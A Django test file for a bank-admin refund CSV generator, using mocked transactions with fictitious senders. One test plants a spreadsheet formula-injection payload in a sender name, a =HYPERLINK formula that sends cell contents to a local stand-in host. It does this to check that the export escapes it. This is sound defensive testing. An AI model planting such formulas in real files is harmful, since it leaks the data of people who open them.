from copy import deepcopy
from datetime import datetime, date, timezone
from unittest import mock

from django.test.client import RequestFactory
from django.urls import reverse
from mtp_common.auth.api_client import get_api_session
from mtp_common.auth.models import MojUser
import responses

from .utils import NO_TRANSACTIONS, api_url, mock_bank_holidays, BankAdminTestCase
from bank_admin import refund
from bank_admin.exceptions import EmptyFileError

REFUND_TRANSACTIONS = {
    'count': 3,
    'results': [{
        'id': '3',
        'amount': 2568,
        'sender_account_number': '22222222',
        'sender_sort_code': '111111',
        'sender_name': 'John Doe',
        'ref_code': '900001',
        'reference': 'for birthday',
        'credited': False,
        'refunded': False,
        'received_at': datetime.now().isoformat()
    }, {
        'id': '4',
        'amount': 1872,
        'sender_account_number': '33333333',
        'sender_sort_code': '999999',
        'sender_name': 'Joe Bloggs',
        'ref_code': '900002',
        'reference': 'A1234 22/03/66',
        'credited': False,
        'refunded': False,
        'received_at': datetime.now().isoformat()
    }, {
        'id': '5',
        'amount': 1000,
        'sender_account_number': '00000005',
        'sender_sort_code': '667788',
        'sender_name': 'Janet Buildingsoc',
        'sender_roll_number': 'A1234567XY',
        'ref_code': '900003',
        'reference': 'beep doop',
        'credited': False,
        'refunded': False,
        'received_at': datetime.now().isoformat()
    }]
}


def expected_output():
    return (
        ('111111,22222222,John Doe,25.68,%(ref_a)s\r\n'
         '999999,33333333,Joe Bloggs,18.72,%(ref_b)s\r\n'
         '667788,00000005,Janet Buildingsoc,10.00,A1234567XY\r\n')
        % {'ref_a': get_base_ref() + '00001',
           'ref_b': get_base_ref() + '00002'}
    )


def get_base_ref():
    return datetime.now().strftime('Refund %d%m ')


class RefundFileTestCase(BankAdminTestCase):

    def setUp(self):
        self.factory = RequestFactory()

    def get_api_session(self, **kwargs):
        request = self.factory.get(
            reverse('bank_admin:download_bank_statement'),
            **kwargs
        )
        request.user = MojUser(
            1, '',
            {'first_name': 'John', 'last_name': 'Smith', 'username': 'jsmith'}
        )
        request.session = mock.MagicMock()
        return get_api_session(request)

    def _generate_refund_file(self, transactions=None, refund_date=None):
        responses.add(
            responses.POST,
            api_url('/transactions/reconcile/'),
            status=200
        )
        responses.add(
            responses.GET,
            api_url('/transactions/'),
            json=transactions or REFUND_TRANSACTIONS
        )
        responses.add(
            responses.PATCH,
            api_url('/transactions/'),
            status=200
        )
        mock_bank_holidays()

        if refund_date is None:
            refund_date = date(2016, 9, 13)
        csvdata = refund.generate_refund_file_for_date(
            self.get_api_session(), refund_date
        )

        return csvdata


class ValidTransactionsTestCase(RefundFileTestCase):

    @responses.activate
    def test_generate_refund_file(self):
        csvdata = self._generate_refund_file(refund_date=date(2016, 9, 13))

        self.assert_called_with(
            api_url('/transactions/reconcile/'), responses.POST,
            {
                'received_at__gte': datetime(2016, 9, 13, 0, 0, tzinfo=timezone.utc).isoformat(),
                'received_at__lt': datetime(2016, 9, 14, 0, 0, tzinfo=timezone.utc).isoformat()
            }
        )

        self.assertEqual(expected_output(), csvdata)

    @responses.activate
    def test_escaping_formulae_in_csv_export(self):
        naughty_transactions = deepcopy(REFUND_TRANSACTIONS)
        naughty_transactions['results'][0]['sender_name'] = (
            '=HYPERLINK("http://127.0.0.1/?value="&A1&A1, '
            '"Error: please click for further information")'
        )
        naughty_transactions['results'][1]['sender_name'] = ('=1+2')

        csvdata = self._generate_refund_file(transactions=naughty_transactions)

        self.assertEqual(
            ('111111,22222222,"\'=HYPERLINK(""http://127.0.0.1/?value=""&A1&A1, '
             '""Error: please click for further information"")",25.68,%(ref_a)s\r\n'
             "999999,33333333,'=1+2,18.72,%(ref_b)s\r\n"
             '667788,00000005,Janet Buildingsoc,10.00,A1234567XY\r\n')
            % {'ref_a': get_base_ref() + '00001',
               'ref_b': get_base_ref() + '00002'},
            csvdata)


class NoTransactionsTestCase(RefundFileTestCase):

    @responses.activate
    def test_generate_refund_file_raises_error(self):
        responses.add(
            responses.POST,
            api_url('/transactions/reconcile/'),
            status=200
        )
        responses.add(
            responses.GET,
            api_url('/transactions/'),
            json=NO_TRANSACTIONS
        )
        mock_bank_holidays()

        with self.assertRaises(EmptyFileError):
            refund.generate_refund_file_for_date(
                self.get_api_session(), date(2016, 9, 13)
            )
